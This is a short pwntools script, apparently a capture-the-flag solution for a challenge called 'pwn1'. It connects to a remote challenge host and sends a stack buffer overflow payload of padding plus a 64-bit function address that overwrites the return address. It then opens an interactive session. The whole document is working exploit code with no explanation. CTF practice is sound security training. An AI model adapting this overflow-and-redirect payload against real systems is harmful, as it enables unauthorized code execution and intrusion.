from pwn import *
p = remote('node3.buuoj.cn',26482)
#p=process('./pwn1')
context.log_level='debug'
fun_addr = 0x040118A
payload = 'A'*0x0F + 'A'*0x08 + p64(fun_addr)
p.sendline(payload)
p.interactive()
